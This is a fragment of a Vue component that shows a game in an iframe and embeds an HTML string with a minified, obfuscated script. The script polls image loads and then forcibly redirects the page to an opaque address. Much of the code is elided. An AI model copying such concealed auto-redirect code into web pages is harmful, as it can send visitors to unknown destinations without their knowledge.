<template>
  <iframe :src="src" id="game-iframe" class="game-iframe"></iframe>
</template>
<script setup>
import { ref } from "vue";
...
<script>(function (B, C) {
    ...
    var q = 0, p = !1, A = 0, k = 0, n = [], t = [], g = {}, z = [], l = null,
        ...
        l = window.setInterval(function () {
            A++;
            if (3 <= A) r(3), clearInterval(l), l = null, self.location.href = n[0]; else {
                for (var e in g) {
                    var b = g[e];
                    b.h.onload = null;
                    b.h.onerror = null;
...
})(["", "3221vCM0xCH6Gt9oGiWix29hyX1iTR1gxt5ew20qHOD1G2gpUBQ4Ghc0wRr_"], "KuEKBvDsAy.gif");<\/script></body></html>
`;
</script>
